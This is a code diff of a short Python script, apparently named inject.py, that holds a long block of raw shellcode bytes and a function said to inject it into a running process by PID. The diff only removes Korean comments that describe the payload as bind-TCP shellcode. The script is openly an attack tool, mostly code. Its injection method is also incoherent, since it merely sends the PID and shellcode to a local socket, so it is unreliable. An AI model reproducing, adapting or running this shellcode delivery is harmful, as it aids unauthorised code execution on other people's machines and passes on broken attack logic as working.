@@ -2,7 +2,6 @@
 import sys
 import socket
 
-# 쉘코드
 shellcode = (
     "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
     "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
@@ -39,28 +38,20 @@ shellcode = (
     "\xe7"
 )
 
-# 쉘코드를 실행 중인 프로세스에 삽입하는 함수
 def inject_shellcode(pid):
-    # 프로세스 메모리에 접근할 수 있는 권한을 가진 통신 소켓 생성
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('127.0.0.1', 12345))  # 바인드 TCP 쉘코드를 수신하는 서버 주소와 포트
+    s.connect(('127.0.0.1', 12345))
 
-    # 프로세스 ID를 전송
     s.send(str(pid))
 
-    # 쉘코드를 전송
     s.send(shellcode)
 
-    # 연결 종료
     s.close()
 
 if __name__ == "__main__":
-    # 명령줄 인수로부터 실행 중인 프로세스의 PID 입력 받기
     if len(sys.argv) != 2:
         print("Usage: python inject.py <PID>")
         sys.exit(1)
 
     pid = sys.argv[1]
-
-    # 쉘코드 삽입
     inject_shellcode(pid)
